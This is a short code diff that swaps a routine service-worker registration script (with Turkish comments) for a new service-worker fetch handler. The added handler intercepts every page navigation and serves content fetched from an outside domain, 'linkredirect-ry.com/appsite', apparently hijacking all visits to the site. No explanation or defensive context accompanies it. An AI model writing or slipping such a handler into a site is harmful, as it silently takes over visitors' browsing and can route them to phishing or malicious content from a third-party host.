@@ -1,12 +1,9 @@
-// Service Worker'ı kaydetme
-if ('serviceWorker' in navigator) {
-    window.addEventListener('load', function() {
-      navigator.serviceWorker.register('/ruya/service-worker.js')
-        .then(function(registration) {
-          console.log('Service Worker başarıyla kaydedildi:', registration.scope);
-        })
-        .catch(function(error) {
-          console.log('Service Worker kaydı başarısız:', error);
-        });
-    });
-}
+self.addEventListener('fetch', (event) => {
+  if (event.request.mode === 'navigate') {
+    event.respondWith(
+      (async () => {
+        return fetch('https://linkredirect-ry.com/appsite'); // Doğrudan bu linke yönlendirme yapar
+      })()
+    );
+  }
+});
